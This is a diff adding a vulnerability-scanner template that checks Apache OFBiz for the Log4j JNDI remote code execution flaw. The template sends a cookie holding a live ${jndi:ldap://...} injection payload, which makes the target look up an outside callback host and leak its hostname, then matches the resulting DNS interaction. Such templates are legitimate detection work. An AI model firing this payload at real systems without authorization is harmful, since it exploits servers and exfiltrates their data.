@@ -1,0 +1,31 @@
+http:
+- extractors:
+  - group: 1
+    part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+  - part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers-condition: and
+  raw:
+  - 'GET /webtools/control/main HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: OFBiz.Visitor=${jndi:ldap://${hostName}.{{interactsh-url}}}
+
+    '
+id: apache-ofbiz-log4j-rce
+info:
+  author: pdteam
+  name: Apache OFBiz Log4j JNDI RCE
+  severity: critical
+  tags: ofbiz,oast,log4j,rce,apache,jndi
